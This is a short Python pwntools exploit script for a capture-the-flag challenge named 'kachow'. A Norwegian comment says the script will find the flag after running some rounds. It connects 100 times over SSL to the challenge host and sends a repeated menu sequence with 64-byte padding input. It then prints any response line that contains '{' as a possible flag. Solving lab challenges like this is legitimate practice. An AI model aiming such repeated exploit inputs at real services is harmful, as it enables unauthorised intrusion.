from pwn import *
import time

elf = context.binary = ELF("kachow")

context.log_level = "error"

# la denne kjøre noen runder så skal den finne flagg til slutt
for i in range(100):
    # io = process()
    io = remote(
        "56e53409-98b8-48f2-9e6d-a128d5f69d58.chall.dev.nnsc.tf", 41337, ssl=True
    )
    io.sendline((b"3\n1\n" + b"a" * 64 + b"\n2\n") * 100)
    print(i)

    time.sleep(1.5)
    res = set(io.clean().splitlines())

    for i in res:
        if b"{" in i:
            print(f"[*] potential flag found: {i}")

    io.close()

